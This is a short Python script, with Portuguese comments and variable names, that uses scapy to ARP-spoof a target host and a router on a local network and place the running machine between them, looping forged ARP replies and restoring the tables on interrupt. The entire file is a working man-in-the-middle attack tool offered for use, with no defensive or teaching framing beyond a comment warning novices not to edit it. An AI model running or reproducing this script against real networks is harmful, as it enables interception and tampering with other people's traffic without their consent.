from scapy.all import ARP, send, getmacbyip
from time import sleep


ip_alvo = "192.168.1.108"
ip_roteador = "192.168.1.1"

interface ="wireless"

#se não entende de scapy básico, nem tente fazer para não dar merda, e se tentar não mude o código (só a variável interface)

def spoof(ip_alvo, ip_roteador):
    pacote = ARP(op=2, pdst=ip_roteador, hwdst=getmacbyip(ip_roteador), psrc=ip_alvo)
    send(pacote, iface=interface, verbose=False)


def restore(ip_alvo, ip_roteador):
    pacote = ARP(op=2, pdst=ip_roteador, hwdst=getmacbyip(ip_roteador), psrc=ip_alvo, hwsrc=getmacbyip(ip_alvo))
    send(pacote, iface=interface, verbose=False)


try:
    while True:
        spoof(ip_alvo, ip_roteador)
        spoof(ip_roteador, ip_alvo)

        print(f"{ip_alvo} == me == {ip_roteador}")

        sleep(30)

        restore(ip_alvo, ip_roteador)

except KeyboardInterrupt:
    restore(ip_alvo, ip_roteador)
    restore(ip_roteador, ip_alvo)
